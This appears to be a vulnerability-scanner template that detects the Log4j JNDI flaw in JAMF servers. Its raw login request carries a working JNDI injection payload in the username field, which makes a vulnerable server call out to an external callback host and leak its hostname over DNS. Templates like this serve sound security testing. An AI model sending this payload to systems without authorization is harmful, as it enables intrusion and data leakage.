id: jamf-log4j-jndi-rce
info:
  author: pdteam
  name: JAMF Log4j JNDI RCE
  reference:
  - https://github.com/random-robbie/jamf-log4j
  severity: critical
  tags: rce,jndi,log4j,jamf
requests:
- extractors:
  - group: 1
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Referer: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded


    username=${jndi:ldap://${hostName}.{{interactsh-url}}/test}&password=

    '
